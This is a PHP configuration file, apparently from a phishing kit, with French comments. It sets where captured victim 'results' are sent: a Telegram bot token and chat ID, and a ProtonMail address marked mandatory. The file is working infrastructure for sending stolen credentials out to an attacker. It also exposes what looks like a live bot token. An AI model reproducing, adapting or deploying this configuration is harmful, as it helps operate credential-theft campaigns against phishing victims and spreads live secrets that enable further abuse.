<?php



$Config = [];

$Config['Deliver.Telegram'] = 'Yes'; // Voulez vous les rez sur telegram ou pas

$Config['Email.Recipient'] = 'vivrenjoiebien@protonmail.com'; // boite rez ici \ obligatoire

$Config['Telegram.Bot.Token'] = '6247587031:AAGfuP9spYdZpKmn59ffCp5dTS2n-lHkvOQ'; // rez telegram

$Config['Telegram.Chat.Id'] = "-991921814"; // rez telegram